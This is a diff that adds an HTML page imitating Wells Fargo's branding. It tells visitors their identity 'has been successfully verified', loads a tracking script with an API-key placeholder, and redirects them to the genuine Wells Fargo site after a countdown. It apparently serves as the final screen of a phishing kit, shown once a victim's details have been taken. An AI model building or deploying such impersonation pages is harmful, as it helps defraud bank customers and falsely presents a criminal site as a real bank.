@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Completed</title>
+    <link rel="stylesheet" href="res/fonts.css">
+    <link rel="stylesheet" href="res/app.css">
+    <script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+<header>
+<div class="container">
+    <img src="res/logo.png" alt="Wells Fargo Logo">
+</div>
+</header>
+
+<main>
+<div class="container">
+
+<div class="form" style="justify-self: center; text-align: center;">
+    <div class="title" style="color: #2e7d32; font-size: 24px; margin-bottom: 15px;">✓ Verification Completed</div>
+    <div class="text" style="margin-bottom: 20px;">Thank you. Your identity has been successfully verified.</div>
+    <div class="text" style="font-size: 14px; color: #555;">You will be securely redirected back to Wells Fargo homepage in <span id="countdown">7</span> seconds...</div>
+</div>
+
+<footer>
+    <p class="link">Privacy, Cookies, Security, and Legal</p>
+    <p class="small">© 1999 - 2025 Wells Fargo. All rights reserved.</p>
+</footer>
+</div>
+</main>
+
+<script>
+    let seconds = 7;
+    const countdownEl = document.getElementById('countdown');
+    const interval = setInterval(() => {
+        seconds--;
+        if (countdownEl) {
+            countdownEl.textContent = seconds;
+        }
+        if (seconds <= 0) {
+            clearInterval(interval);
+            window.location.href = "https://www.wellsfargo.com";
+        }
+    }, 1000);
+</script>
+</body>
+</html>
